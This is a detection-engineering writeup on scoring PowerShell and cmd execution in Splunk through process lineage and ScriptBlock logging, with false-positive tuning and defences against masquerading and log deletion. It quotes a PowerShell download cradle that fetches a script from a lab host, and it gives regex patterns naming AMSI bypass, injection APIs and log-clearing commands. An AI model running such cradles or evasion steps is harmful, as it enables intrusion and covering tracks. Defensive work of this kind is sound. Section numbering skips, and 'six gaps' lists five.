# T1059 — Command and Scripting Interpreter: Two-Layer Detection via Process Lineage and Script Content


# 1. Scenario

A Meterpreter `reverse_tcp` payload is delivered via a `certutil` download cradle, executed, and used to spawn an interactive command shell. The operator runs a host-discovery burst inside that shell.

But the detection thesis is not about this one payload. T1059 is the hardest false-positive problem in the matrix: `powershell.exe ran` and `cmd.exe ran` carry **zero information** — the interpreter running is normal. Every admin, every EDR agent, every login script, every SCCM package spawns them. What is scored is not that the interpreter ran, but **how** it ran: the parent that spawned it, the arguments it carried, and — where telemetry allows — the content it executed.

That last clause forces a two-layer design. Process-create telemetry (Sysmon EID 1 / Endpoint DM) sees lineage and command line but **cannot see decoded script content** — an encoded PowerShell command appears only as a base64 blob. Per ATT&CK v19, this caps process-create confidence at 0.7. Seeing the deobfuscated payload requires **EID 4104 ScriptBlock Logging**, which lifts the ceiling to 0.9. The same encoded command is therefore scored by two independent feeders — one reading lineage, one reading content — and correlated in the risk layer.

This writeup builds both feeders, migrates the process-create layer to accelerated `tstats`, and hardens two production gaps: parent-name **masquerading** and **indicator-removal blindness**.

# 4. The Scoring Model

Portfolio-wide framework: `risk = impact × confidence`, held constant across techniques. Per ATT&CK v19 for T1059:

**Impact** — the interpreter alone is directionless (impact lives in what it carries), so the base is low and raised by context:

| Context | Impact |
|---|---|
| Standard execution | 50 |
| SYSTEM / High integrity | 65 |
| Remote WMI / WinRM (lateral) | 70 |

**Confidence** — calibrated to ATT&CK's v19 reference points:

| Reference | Calculation | Meaning |
|---|---|---|
| `50 × 0.0` | bare `powershell.exe ran` | Zero information — not even a feeder |
| `65 × 0.85` | anomalous parent (Office/web → interpreter) | Direct-alert territory |
| `65 × 0.60` | encoded command, decoded via 4104 | Download-cradle content |
| Process-create ceiling | **0.85** | Lineage + arguments, no content |
| 4104 ceiling | **0.90** | Decoded script content visible |

The two ceilings are the architecture. Process-create can never see content, so it caps below 4104 — exactly the v19 statement that "with 4104 disabled, confidence locks at 0.7." Enabling 4104 is the **detectability precondition** for this technique, not an optional enhancement.

# 5. Layer 1 — Process-Create Feeder (`tstats` / Endpoint DM)

## 5.1 Why tstats

The initial rule read raw `index=windows_sysmon` over a 30-day window. Migrating to the accelerated Endpoint data model cuts that to a summary read. The critical precondition: **does `Processes.process` retain the full command line?** Verified before migrating —

```
Processes.process: "C:\WINDOWS\SystemTemp\...\chrome_installer.exe" --verbose-logging --do-not-launch-chrome --channel=stable
```

Arguments intact. So `enc`, `cradle`, `bare_cmd`, `stealth` all survive the move. Had `Processes.process` held only the exe name, `tstats` would have destroyed the rule's entire value (command-line analysis) — the migration would have been a downgrade, not an upgrade.

One semantic shift matters: raw `ParentImage` held only the parent's exe path; CIM `parent_process` holds the parent's **full command line**. This *added* real signal — `mshta.exe "...\Downloads\bill.hta"` now scores `susp_path` on the HTA argument, which raw telemetry missed — but also introduced a false `susp_path` on `w3wp.exe` (its config path contains `\temp\`). The latter is dominated by `parent_lineage=4` and does not affect the verdict. Data-model migration changing signal semantics is a subtlety most miss.

## 5.2 The Rule

[SPL_Query](../../Rules/Splunk-SPL/Execution/proccreate.spl)

## 5.3 Signals

| Signal | Weight | Meaning |
|---|---|---|
| `parent_lineage` | 4 | Interpreter spawned by Office / web server / SQL — the strongest single indicator, direct-alert per v19 |
| `untrusted_parent` | 3 | Parent runs from a user-writable path (`Temp`, `temp_test`, `AppData\Local\Temp`) outside `Program Files` |
| `susp_path` | 1 | Suspicious token in parent path/args |
| `bare_cmd` | 1 | `cmd.exe` with no arguments → interactive shell channel |
| `enc` | 2 | Base64 `-enc` / `-EncodedCommand` |
| `stealth` | 1 | `-w hidden` window suppression |
| `chain` | 1 | `cmd /c powershell` lineage |
| `cradle` | 2 | Download-cradle tokens (`Net.WebClient`, `certutil -urlcache`, `bitsadmin`) |
| `exec_bypass` | 1 | `-ExecutionPolicy Bypass` — **only when combined** with another signal (see §5.4) |

## 5.4 False-Positive Analysis

Real benign traffic surfaced over the 30-day window, tuned out behaviourally rather than by path exclusion:

| Class | Signal that fired | Resolution |
|---|---|---|
| VS Code / Claude Code driving `cmd` | `susp_path` (AppData) | Removed `AppData`/`Users` from `susp_path`; allowlisted by name+path |
| Realtek driver `-ExecutionPolicy Bypass` | `exec_bypass` | `exec_bypass` gated — fires only alongside `susp_path`/`cradle`/`enc` |
| Signal / Discord / Spotify auto-updaters | `untrusted_parent` (AppData) | Name+path allowlist (§7) |
| App prereq checks (`exit 0/1`, `Get-Command`) | `untrusted_parent` | `benign_check` — behavioural filter on command content |
| Own triage (`Get-WinEvent ... DownloadString`) | `cradle` | `is_logquery` gate — log-read is not a download |

Two design points are load-bearing. **`exec_bypass` alone is not a signal** — legitimate installers (Realtek, VS Code) use it constantly; only `Bypass` *combined* with a suspicious path or download scores. **`benign_check` is behavioural, not path-based** — app updaters run prereq checks (`exit 0/1`, `.StartsWith(`, `Get-ExecutionPolicy`); the same filter catches Signal, Discord, and any future updater with one rule, rather than a per-app exclusion list.

## 5.5 Validated Output

| Event | Signals | risk_score |
|---|---|---|
| `w3wp → cmd /c certutil` | lineage4 + cradle2 + susp1 | **52.65** |
| `w3wp → cmd` discovery ×10 | lineage4 + susp1 | 48.75 |
| **`update.exe → cmd`** (Meterpreter) | untrusted3 + susp1 + bare1 | **42.25** |
| `mshta → powershell` | lineage4 + stealth + bypass | 40.50 |
| enc-only tests | enc2 | 13.00 (feeder only) |

`update.exe → cmd` sorts above every benign event — the Meterpreter shell, on a masqueraded binary, correctly outranks noise. In the first iteration (before `parent_lineage` and `untrusted_parent`) this same event scored 15.60, *below* a benign VS Code install. The signals that fixed it are the two the original rule lacked.

# 6. Layer 2 — ScriptBlock Feeder (EID 4104)

## 6.1 Why a Second Feeder

The encoded commands scored `enc=2 → 13` in Layer 1 — a blob, content invisible. The same commands in 4104:

```
IEX (New-Object Net.WebClient).DownloadString("http://192.168.56.102/a.ps1")
```

Decoded, readable, a download cradle. Layer 1 saw "something encoded ran"; Layer 2 sees "a download cradle ran." Same event, two telemetry sources — the v19 ceiling difference (0.7 vs 0.9) made concrete in the lab's own data.

## 6.2 The Rule

[SPL_Query](../../Rules/Splunk-SPL/Execution/scriptblock.spl)

## 6.3 Signals

| Signal | Weight | Meaning |
|---|---|---|
| `cradle` | 3 | Decoded download cradle (`DownloadString`, `Invoke-WebRequest`, `Net.WebClient`) |
| `amsi` | 4 | AMSI bypass (`amsiInitFailed`, `[Ref].Assembly`) |
| `inject` | 4 | In-memory injection (`VirtualAlloc`, `CreateRemoteThread`, reflective load) |
| `indicator_removal` | 4 | Log/artefact deletion (`Clear-EventLog`, `wevtutil cl`, `Remove-Item *.csv/.evtx`) — see §8 |
| `obfusc` | 2 | `FromBase64String`, `-bxor` |
| `downgrade` | 2 | `-version 2` PowerShell downgrade |
| `iex_local` | 1 | `Invoke-Expression` on a local string (not a download) |

## 6.4 False-Positive Analysis

4104 logs *everything* PowerShell compiles, so the FP surface is large and specific:

| Class | Why it fired | Resolution |
|---|---|---|
| VS Code shell integration | `Invoke-Expression $activateScript` | `is_vscode` — matches `__VSCodeState`, `OSC 633` markers |
| VS Code fn fragments | `[char]0x1b` ANSI escapes read as obfuscation | Removed `[char]\d` from `obfusc`; `is_vscode` |
| Signed MS scripts | contain `Invoke-Expression` | `is_signed` — `SIG # Begin signature block` |
| Atomic Red Team modules | module manifests | `is_atomicmodule` |
| Own triage (`Get-WinEvent`) | contains `DownloadString` string | `is_logread` — read, not download |
| `Invoke-Expression "Get-ChildItem"` | `iex` token | `iex_local` weight 1, not `cradle` 3 — no network |

The decisive lesson: **`IEX` is not always a cradle.** `IEX (DownloadString(...))` fetches and runs remote content — weight 3. `Invoke-Expression "<local command>"` runs a local string — weight 1. Keying `cradle` on the *download* tokens rather than on `IEX` itself separates the two. A second subtlety: ScriptBlock Logging splits long scripts into fragments across separate events, so the signature block (`SIG #`) lands in a *different* event than the function body — signed content must be caught by name-based markers, not only by the signature string.

## 6.5 Validated Output

| Event | Signal | risk_score |
|---|---|---|
| `Remove-Item .\legal_apps.csv` | indicator_removal4 | **45.50** |
| `IEX DownloadString`, `Invoke-WebRequest update.exe` | cradle3 | 39.00 |

Every remaining row is a real download cradle or an indicator-removal attempt. VS Code, Atomic modules, signed scripts, and log-read triage all fall below threshold.

# 7. Hardening: Masquerading (Name ≠ Trust)

A name-only allowlist is a masquerading hole: an attacker names their binary `Slack.exe`, the allowlist says "Slack is safe," and the rule goes blind. The lab already contains the proof — the Meterpreter payload is named `update.exe`, and a test binary was staged as `C:\temp_test\Spotify.exe`.

The fix: allowlist entries require **name *and* path**. `legal_parent_name.csv` carries a `required_path` anchor sourced from where each app genuinely runs:

```csv
parent_process_name,required_path
Discord.exe,\AppData\Local\Discord\
Signal.exe,\AppData\Local\Programs\signal-desktop\
Update.exe,\AppData\Local\Discord\
```

```spl
| rex field=parent_process "^\"?(?<parent_full_path>[a-z]:\\\\[^\"]+?\.exe)"
| lookup legal_parent_name.csv parent_process_name AS parent_exe OUTPUT required_path
| eval name_hit=if(isnotnull(required_path) AND match(lower(parent_full_path),lower(required_path)),1,null())
| where isnull(name_hit) AND isnull(path_hit)
```

Result, verified against real data: legitimate Discord, Signal, and Spotify — which ran continuously over 30 days and previously produced FPs — are now silent (name + path both match). A binary named `Spotify.exe` running from `C:\temp_test\` fails the path anchor and is scored. And `update.exe` — a benign-looking name from `temp_test` — is caught at 42.25. **The name grants no trust; the location betrays it.**

This is what defeats masquerading: signature-based verification would be stronger, but Sysmon EID 1 in this config does not log parent signatures (`Signed`/`SignatureStatus` are empty — only `Company` populates), so the path anchor is the available control. In production, signature or hash anchoring should replace it.

# 8. Hardening: Indicator-Removal Blindness

Filtering out own-triage log queries (`is_logquery`) creates a defensive blind spot: an attacker also reads and *deletes* logs (T1070). Blanket-allowing `Get-WinEvent` would blind the rule to that.

The resolution separates **reading** from **destroying**:

```spl
| eval indicator_removal=if(match(ScriptBlockText,"(?i)(clear-eventlog|wevtutil\s+cl|remove-item.*\.(csv|log|evtx|xml)|clear-history)"),4,0)
| eval is_logread=if(match(ScriptBlockText,"(?i)(get-winevent|get-eventlog|-logname\s)") AND indicator_removal=0,1,0)
| where is_logread=0 ...
```

Log *reading* from a benign context is allowlisted (own triage). Log/artefact *deletion* is never allowlisted — it scores `indicator_removal=4`. Proof: `Remove-Item .\legal_apps.csv` — an attempt to delete the detection's own allowlist — scores 45.50, the top of the 4104 feeder. An attacker deleting detection artefacts is caught; the analyst reading logs is not.

> **Caveat:** `is_logread` still carries residual blindness — an attacker could read logs from a benign-looking context. In production this is better solved by excluding known analyst accounts via `SubjectUserName` rather than by command pattern. The 4104 events here expose only `UserID` (SID), so account-based separation was not available in this lab.

# 9. Architecture

```
Layer 1: Process-create (tstats/Endpoint DM, ceiling 0.85) ──┐
Layer 2: ScriptBlock 4104 (ceiling 0.90)                     ─┴─→ index=risk ──→ RBA rule ──→ ALERT
```

Both feeders emit `risk_object=Computer` and `collect index=risk`. The same encoded PowerShell is scored twice — `enc=2` (blob) in Layer 1, `cradle=3` (decoded) in Layer 2 — and the risk layer sums them by host. Neither feeder alerts alone; the correlation rule makes the decision. This mirrors the v19 model: bare execution is neither alert nor feeder, anomalous parent is a direct alert, and encoded/cradle content stacks in the feeder.

# 11. Limitations & Production Readiness

**Validated:** two-layer feeder split; `tstats` migration with command-line integrity confirmed; additive scoring calibrated to v19 reference points; masquerading defeated by path anchor against real app data; indicator-removal separated from log-read; behavioural FP tuning across VS Code, Signal, Realtek, and own triage.

**Not production-ready — six gaps, honestly stated:**

1. **`Computer=` / `dest=` hardcoded** to one host. Removing it exposes the true fleet FP surface, which single-host tuning has not seen.
2. **Allowlist anchored on path, not signature** — stronger than name-only, but path can be mimicked. Sysmon EID 1 lacks parent signature here; production should anchor on signature/hash.
3. **All FP tuning is this host's noise.** SCCM, GPO login scripts, other EDR agents, DevOps CI/CD produce different FPs not seen here.
4. **Thresholds derived from one machine's distribution.** Base rate shifts on a real fleet ("millions of executions daily").
5. **`is_logread` residual blindness** — pattern-based, not account-based. Needs `SubjectUserName` separation.
